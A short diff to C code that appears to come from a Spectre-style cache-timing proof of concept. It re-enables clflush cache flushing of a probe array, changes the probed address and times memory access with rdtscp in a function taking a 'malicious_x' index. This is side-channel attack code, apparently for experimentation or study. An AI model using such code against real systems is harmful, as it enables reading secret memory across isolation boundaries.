@@ -65,15 +65,15 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
   for (tries = 999; tries > 0; tries--) {
 
     /* Flush big array[4096*(0..255)] from cache */
-   // for (i = 0; i < 4096; i++)
-     // _mm_clflush( & bigArray[i * 512]); /* intrinsic for clflush instruction */
+    for (i = 0; i < 4096; i++)
+      _mm_clflush( & bigArray[i * 512]); /* intrinsic for clflush instruction */
 
         
     /* Call t   victim! */
     victim_function(); //store in big[0]
 
    
-    addr = & bigArray[1];
+    addr = & bigArray[1500];
     time1 = __rdtscp( & junk); /* READ TIMER */
     junk = * addr; /* MEMORY ACCESS TO TIME */
     time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
